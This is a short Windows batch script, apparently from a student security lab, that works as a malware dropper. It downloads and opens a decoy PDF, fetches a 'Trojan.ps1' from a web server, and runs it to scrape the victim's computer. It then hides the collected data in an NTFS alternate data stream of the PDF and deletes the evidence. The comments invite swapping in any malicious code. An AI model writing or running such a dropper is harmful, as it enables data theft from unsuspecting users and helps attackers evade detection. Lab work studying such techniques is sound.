cd %TEMP% 
::Change to the directory, download from the webserve the pdf, this can be replaced with any content you might want to open
Powershell -Command "Invoke-WebRequest 'http://localhost:80/img/Answers.pdf' -OutFile Answers.pdf"
::Open the PDF
Answers.pdf
::Download the malware to scrape the client computer, can replace this url with any malicous code you want
Powershell -Command "Invoke-WebRequest 'http://localhost:80/img/Trojan.ps1' -OutFile Trojan.ps1"
::Run the scraping file
Powershell.exe -executionpolicy remotesigned -File  Trojan.ps1
::Store the resulting file in the ADS of the Answers.pdf
c:\temp\info_s3848017s3868494.dll > c:\temp\Answers.pdf:info_s3848017s3868494.dll 
::Hide The evidence
del info_s3848017s3868494.dll